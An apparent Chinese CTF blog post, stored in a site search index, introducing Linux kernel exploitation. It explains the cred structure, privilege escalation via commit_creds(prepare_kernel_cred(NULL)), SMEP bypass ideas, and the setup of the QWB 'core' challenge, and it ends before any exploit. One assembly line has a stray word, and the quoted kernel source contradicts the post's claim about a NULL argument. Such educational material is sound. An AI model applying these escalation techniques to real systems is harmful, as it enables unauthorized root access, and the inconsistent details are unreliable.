<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kernel-pwn入门学习</title>
      <link href="2024/02/11/kernal-pwn%E5%AD%A6%E4%B9%A0/"/>
      <url>2024/02/11/kernal-pwn%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><blockquote><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p></blockquote><h3 id="内核模块"><a href="#内核模块" class="headerlink" title="内核模块"></a>内核模块</h3><p>内核模块一般有驱动程序和内核扩展模块，Linux是单内核系统，需要模块机制来进行扩展和维护，一般CTF Kernel Pwn就是挖掘模块的漏洞。</p><blockquote><p>insmod: 加载模块到内核</p><p>rmmod: 卸载模块</p><p>lsmod: 列出加载的模块</p><p>modprobe: 添加或删除模块</p></blockquote><h3 id="用户空间到内核空间"><a href="#用户空间到内核空间" class="headerlink" title="用户空间到内核空间"></a>用户空间到内核空间</h3><p>当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过<code>swapgs</code>切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的代码如下:</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> &#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F;</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> &#x2F;* 保存栈值，并设置内核栈 *&#x2F;</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi             &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi             &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu    &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9              &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure><ol><li><p>通过汇编指令判断是否为 x32_abi。</p></li><li><p>通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。</p></li></ol><h3 id="内核空间到用户空间"><a href="#内核空间到用户空间" class="headerlink" title="内核空间到用户空间"></a>内核空间到用户空间</h3><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><h3 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h3><p>每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="task-struct结构体"><a href="#task-struct结构体" class="headerlink" title="task_struct结构体"></a>task_struct结构体</h3><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，task_struct主要有以下的成员：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">audit_context</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_plug</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_run_ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cfs_rq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">futex_pi_state</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_context</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">perf_event_context</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reclaim_state</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">robust_list_head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">root_domain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_delay_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_group</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_event_mm</span>;</span></span><br></pre></td></tr></table></figure><p>源码链接：<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L746">https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L746</a></p><p>task_struct中有cred指针：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p>要改变一个进程的cred结构体，就能改变其执行权限，在内核空间有如下两个函数，都位于kernel/cred.c中：</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是daemon参数应为有效的进程描述符地址或NULL，如果传入NULL，则会返回一个root权限的cred。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_kernel_cred - Prepare a set of credentials for a kernel service</span></span><br><span class="line"><span class="comment"> * @daemon: A userspace daemon to be used as a reference</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a set of credentials for a kernel service.  This can then be used to</span></span><br><span class="line"><span class="comment"> * override a task&#x27;s own credentials so that work can be done on behalf of that</span></span><br><span class="line"><span class="comment"> * task that requires a different subjective context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @daemon is used to provide a base cred, with the security data derived from</span></span><br><span class="line"><span class="comment"> * that; if this is &quot;&amp;init_task&quot;, they&#x27;ll be set to 0, no groups, full</span></span><br><span class="line"><span class="comment"> * capabilities, and no keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller may change these controls afterwards if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the new credentials or NULL if out of memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_long_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">new</span>-&gt;ucounts = get_ucounts(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure><ul><li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的cred结构体应用到进程。内核态就需要调用<code>commit_creds(prepare_kernel_cred(NULL))</code>即可达成提权功能。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * commit_creds - Install new credentials upon the current task</span></span><br><span class="line"><span class="comment"> * @new: The credentials to be assigned</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Install a new set of credentials to the current task, using RCU to replace</span></span><br><span class="line"><span class="comment"> * the old set.  Both the objective and the subjective credentials pointers are</span></span><br><span class="line"><span class="comment"> * updated.  This function may not be called if the subjective credentials are</span></span><br><span class="line"><span class="comment"> * in an overridden state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function eats the caller&#x27;s reference to the new credentials.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Always returns 0 thus allowing this function to be tail-called at the end</span></span><br><span class="line"><span class="comment"> * of, say, sys_setgid().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;commit_creds(%p&#123;%ld&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">       atomic_long_read(&amp;<span class="keyword">new</span>-&gt;usage));</span><br><span class="line"></span><br><span class="line">BUG_ON(task-&gt;cred != old);</span><br><span class="line">BUG_ON(atomic_long_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumpability changes */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment"> * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment"> * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment"> * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment"> * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment"> * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">smp_wmb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* alter the thread keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">key_fsuid_changed(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">key_fsgid_changed(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* do it</span></span><br><span class="line"><span class="comment"> * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment"> * in set_user().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">inc_rlimit_ucounts(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send notifications */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred_many(old, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(commit_creds);</span><br></pre></td></tr></table></figure><h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><ol><li>KASLR</li></ol><p>与用户态ASLR类似，在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p><ol><li>FGKASLR</li></ol><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，以函数粒度重新排布内核代码。</p><ol><li>STACK PROTECTOR</li></ol><p>类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 kernel panic。内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值。</p><ol><li>SMAP/SMEP</li></ol><p>SMAP即管理模式访问保护（Supervisor Mode Access Prevention），SMEP即管理模式执行保护（Supervisor Mode Execution  Prevention），这两种保护通常是同时开启的，用以阻止内核空间直接访问/执行用户空间的数据，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。SMEP保护的绕过有以下两种方式：</p><ul><li>利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 ret2dir。</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel  ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，但对于开启了 KPTI  的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式。</li></ul><h2 id="入门题目-强网杯core"><a href="#入门题目-强网杯core" class="headerlink" title="入门题目 - 强网杯core"></a>入门题目 - 强网杯core</h2><p>题目附件解开后有如下文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root at mypwn in /ctf/work/kernel-pwn/core</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">bzImage  core.cpio  start.sh  vmlinux</span><br></pre></td></tr></table></figure><p>start.sh如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>开启了kaslr保护，需要泄露地址。还有要把内存改为128M，要不然可能跑不起来。</p><p>首先解压文件系统：</p><figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">root at mypwn <span class="keyword">in</span> /ctf/work/kernel-pwn/core</span><br><span class="line">$ cpio -idm &lt; ./core.cpio</span><br><span class="line">cpio: vmlinux not created: newer or same age version exists</span><br><span class="line">104379 blocks</span><br><span class="line"></span><br><span class="line">root at mypwn <span class="keyword">in</span> /ctf/work/kernel-pwn/core</span><br><span class="line">$ ls</span><br><span class="line">bin      core.cpio  etc          init  lib64    proc  sbin      sys  usr</span><br><span class="line">bzImage  core.ko    gen_cpio.sh  lib   linuxrc  root  start.sh  tmp  vmlinux</span><br></pre></td></tr></table></figure><p>看下init脚本如下：</p><figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">$ cat init</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  